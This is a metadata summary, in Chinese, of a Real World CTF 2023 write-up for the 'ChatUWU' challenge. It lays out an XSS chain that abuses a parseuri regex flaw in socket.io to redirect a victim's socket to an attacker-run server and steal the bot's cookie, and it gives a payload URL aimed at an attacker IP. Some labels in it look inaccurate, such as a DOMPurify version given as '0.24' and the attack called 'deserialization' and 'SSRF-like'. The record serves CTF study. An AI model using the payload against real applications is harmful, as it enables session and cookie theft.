...
quality: high
full_path: Realworld_CTF_2023_ChatUWU_详解.full.md
meta_path: Realworld_CTF_2023_ChatUWU_详解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: Realworld CTF 2023 - ChatUWU 详解。Realworld CTF 2023 ChatUWU：socket.io 聊天室 DOMPurify 0.24 房间渲染 + parseuri 正则 @host 解析错误 → 攻击者控制 socket 服务器发送 XSS payload。。关键路径：socket.io 聊天室 + DOMPurify 0.24.0 (基本无洞) ...
category: web
subcategory: xss
...
contest_type: open
wp_url: https://www.ctfiot.com/105233.html
reasoning_chain:
- socket.io 聊天室 + DOMPurify 0.24.0 过滤 from/text → 触发点：location.search 直接拼 URL
- 前端 io(`/${location.search}`) → 假设：socket URL 受 query 控制 → 后端 io.to('DOMPurify').emit('msg', {from, text, isHtml:true})
- 关键：socket.io 内部用 parseuri (galkn/parseuri) 解析 uri → 假设：正则 bug 可绕过
- 漏洞：parseuri 正则 /^(?:(?![^:@]+:[^:@/]*@)(http|https|ws|wss)://)?(...)?(@)?/ 解析 host 错误
- payload：http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000
- '@ 后面被解析为 authority (host:port) 而非 username → 假设：可指向 attacker 服务器'
- '动作：部署恶意 socket.io 服务器 (cors: ''*'') + 监听 0.0.0.0:7890 → 发送 {from:''pankas'', text:'''', isHtml:true}'
- 完整利用：xssbot 访问恶意 URL + 触发内联 img/iframe + 窃取 cookie
failed_attempts:
- 试图绕过 DOMPurify → 失败：0.24 几乎无洞
- 试图直接走 text 字段 → 失败：必须 isHtml=true 才 innerHTML
- 试图覆盖 location.search → 失败：必须 query 参数可控
key_observations:
- socket.io + parseuri 正则 @authority 解析错误是 web 经典高阶利用
- 房间级 isHtml 标志是 XSS 触发点
- location.search 直接拼 URL 是反序列化攻击入口
- DOMPurify 0.24 后端过滤 + parseuri 客户端绕过是双层组合
- attacker 部署 rogue socket.io 服务器是 SSRF-like 攻击
prerequisites:
- socket.io 协议 + parseuri 源码
- DOMPurify 过滤白名单理解
- rogue server + cors 通配
- xssbot 触发机制
---
